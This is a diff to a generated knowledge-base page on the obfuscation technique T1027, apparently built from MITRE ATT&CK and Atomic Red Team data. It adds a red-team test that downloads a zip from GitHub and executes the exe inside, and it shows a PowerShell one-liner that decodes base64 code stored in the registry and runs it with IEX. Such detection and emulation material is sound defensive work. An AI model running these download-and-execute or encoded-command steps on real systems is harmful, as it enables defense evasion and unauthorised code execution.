@@ -15,14 +15,20 @@ Adversaries may also obfuscate commands executed from payloads or directly via a
 
 Another example of obfuscation is through the use of steganography, a technique of hiding messages or code in images, audio tracks, video clips, or text files. One of the first known and reported adversaries that used steganography activity surrounding [Invoke-PSImage](https://attack.mitre.org/software/S0231). The Duqu malware encrypted the gathered information from a victim's system and hid it into an image followed by exfiltrating the image to a C2 server. (Citation: Wikipedia Duqu) By the end of 2017, an adversary group used [Invoke-PSImage](https://attack.mitre.org/software/S0231) to hide PowerShell commands in an image file (png) and execute the code on a victim's system. In this particular case the PowerShell code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary. (Citation: McAfee Malicious Doc Targets Pyeongchang Olympics)
 
+## Aliases
+
+```
+
+```
+
 ## Additional Attributes
 
 * Bypass: ['Host forensic analysis', 'Signature-based detection', 'Host intrusion prevention systems', 'Application whitelisting', 'Process whitelisting', 'Log analysis', 'Whitelisting by file name or path']
 * Effective Permissions: None
-* Network: intentionally left blank
+* Network: None
 * Permissions: None
 * Platforms: ['Linux', 'macOS', 'Windows']
-* Remote: intentionally left blank
+* Remote: None
 * Type: attack-pattern
 * Wiki: https://attack.mitre.org/techniques/T1027
 
@@ -63,6 +69,10 @@ $EncodedCommand
 
 Set-ItemProperty -Force -Path #{registry_key_storage} -Name Debug -Value $EncodedCommand
 powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} Debug).Debug)))"
+
+"%temp%\temp_T1027.zip\T1027.exe"
+
+"#{exe_payload}"
 
 [a-z0-9]{1}.exe
 *.exe \*.exe\:Zone.Identifier:$DATA" 
@@ -128,6 +138,12 @@ powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::From
              '#{registry_key_storage} Debug).Debug)))"\n',
   'name': None,
   'source': 'atomics/T1027/T1027.yaml'},
+ {'command': '"%temp%\\temp_T1027.zip\\T1027.exe"\n',
+  'name': None,
+  'source': 'atomics/T1027/T1027.yaml'},
+ {'command': '"#{exe_payload}"\n',
+  'name': None,
+  'source': 'atomics/T1027/T1027.yaml'},
  {'command': '[a-z0-9]{1}.exe',
   'name': 'parent_process',
   'source': 'Threat Hunting Tables'},
@@ -180,7 +196,29 @@ powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::From
                   'tags': ['attack.defense_evasion',
                            'attack.t1140',
                            'attack.t1027'],
-                  'title': 'Ping Hex IP'}}]
+                  'title': 'Ping Hex IP'}},
+ {'data_source': ['5156', 'Windows Firewall']},
+ {'data_source': ['4688 ', 'Process CMD Line']},
+ {'data_source': ['Windows event logs']},
+ {'data_source': ['4663 - File Auditing', 'File monitoring']},
+ {'data_source': ['B9', 'Bninary file metadata']},
+ {'data_source': ['Malware reverse engineering']},
+ {'data_source': ['Environment variable']},
+ {'data_source': ['Network protocol analysis']},
+ {'data_source': ['Network intrusion', 'detection system']},
+ {'data_source': ['Email gateway']},
+ {'data_source': ['SSL/TLS inspection']},
+ {'data_source': ['5156', 'Windows Firewall']},
+ {'data_source': ['4688 ', 'Process CMD Line']},
+ {'data_source': ['4663', 'File monitoring']},
+ {'data_source': ['LOG-MD - B9', 'Bninary file metadata']},
+ {'data_source': ['Windows event logs']},
+ {'data_source': ['Network protocol analysis']},
+ {'data_source': ['Malware reverse engineering']},
+ {'data_source': ['Environment variable']},
+ {'data_source': ['Network intrusion detection system']},
+ {'data_source': ['Email gateway']},
+ {'data_source': ['SSL/TLS inspection']}]
 ```
 
 ## Potential Queries
@@ -218,7 +256,8 @@ powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::From
 ## Raw Dataset
 
 ```json
-[{'Atomic Red Team Test - Obfuscated Files or Information': {'atomic_tests': [{'description': 'Creates '
+[{'Atomic Red Team Test - Obfuscated Files or Information': {'atomic_tests': [{'auto_generated_guid': 'f45df6be-2e1e-4136-a384-8f18ab3826fb',
+                                                                               'description': 'Creates '
                                                                                               'a '
                                                                                               'base64-encoded '
                                                                                               'data '
@@ -280,7 +319,8 @@ powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::From
                                                                                        'Script',
                                                                                'supported_platforms': ['macos',
                                                                                                        'linux']},
-                                                                              {'description': 'Creates '
+                                                                              {'auto_generated_guid': 'a50d5a97-2531-499e-a1de-5544c74432c6',
+                                                                               'description': 'Creates '
                                                                                               'base64-encoded '
                                                                                               'PowerShell '
                                                                                               'code '
@@ -339,7 +379,8 @@ powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::From
                                                                                        'base64-encoded '
                                                                                        'PowerShell',
                                                                                'supported_platforms': ['windows']},
-                                                                              {'description': 'Stores '
+                                                                              {'auto_generated_guid': '450e7218-7915-4be4-8b9b-464a49eafcec',
+                                                                               'description': 'Stores '
                                                                                               'base64-encoded '
                                                                                               'PowerShell '
                                                                                               'code '
@@ -441,6 +482,80 @@ powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::From
                                                                                        'from '
                                                                                        'Windows '
                                                                                        'Registry',
+                                                                               'supported_platforms': ['windows']},
+                                                                              {'auto_generated_guid': 'f8c8a909-5f29-49ac-9244-413936ce6d1f',
+                                                                               'dependencies': [{'description': 'T1027.exe '
+                                                                                                                'must '
+                                                                                                                'exist '
+                                                                                                                'on '
+                                                                                                                'disk '
+                                                                                                                'at '
+                                                                                                                'specified '
+                                                                                                                'location\n',
+                                                                                                 'get_prereq_command': 'Invoke-WebRequest '
+                                                                                                                       '"#{url_path}" '
+                                                                                                                       '-OutFile '
+                                                                                                                       '"$env:temp\\T1027.zip"\n'
+                                                                                                                       'Expand-Archive '
+                                                                                                                       '-path '
+                                                                                                                       '"$env:temp\\T1027.zip" '
+                                                                                                                       '-DestinationPath '
+                                                                                                                       '"$env:temp\\temp_T1027.zip\\"\n',
+                                                                                                 'prereq_command': 'if '
+                                                                                                                   '(Test-Path '
+                                                                                                                   '#{exe_payload}) '
+                                                                                                                   '{exit '
+                                                                                                                   '0} '
+                                                                                                                   'else '
+                                                                                                                   '{exit '
+                                                                                                                   '1}\n'}],
+                                                                               'dependency_executor_name': 'powershell',
+                                                                               'description': 'Mimic '
+                                                                                              'execution '
+                                                                                              'of '
+                                                                                              'compressed '
+                                                                                              'executable. '
+                                                                                              'When '
+                                                                                              'successfully '
+                                                                                              'executed, '
+                                                                                              'calculator.exe '
+                                                                                              'will '
+                                                                                              'open.\n',
+                                                                               'elevation_required': True,
+                                                                               'executor': {'cleanup_command': 'taskkill '
+                                                                                                               '/f '
+                                                                                                               '/im '
+                                                                                                               'calculator.exe '
+                                                                                                               '>nul '
+                                                                                                               '2>nul\n'
+                                                                                                               'rmdir '
+                                                                                                               '/S '
+                                                                                                               '/Q '
+                                                                                                               '%temp%\\temp_T1027.zip '
+                                                                                                               '>nul '
+                                                                                                               '2>nul\n'
+                                                                                                               'del '
+                                                                                                               '/Q '
+                                                                                                               '"%temp%\\T1027.zip" '
+                                                                                                               '>nul '
+                                                                                                               '2>nul\n',
+                                                                                            'command': '"#{exe_payload}"\n',
+                                                                                            'name': 'command_prompt'},
+                                                                               'input_arguments': {'exe_payload': {'default': '%temp%\\temp_T1027.zip\\T1027.exe',
+                                                                                                                   'description': 'EXE '
+                                                                                                                                  'to '
+                                                                                                                                  'execute',
+                                                                                                                   'type': 'Path'},
+                                                                                                   'url_path': {'default': 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/bin/T1027.zip',
+                                                                                                                'description': 'url '
+                                                                                                                               'to '
+                                                                                                                               'download '
+                                                                                                                               'Exe',
+                                                                                                                'type': 'url'}},
+                                                                               'name': 'Execution '
+                                                                                       'from '
+                                                                                       'Compressed '
+                                                                                       'File',
                                                                                'supported_platforms': ['windows']}],
                                                              'attack_technique': 'T1027',
                                                              'display_name': 'Obfuscated '
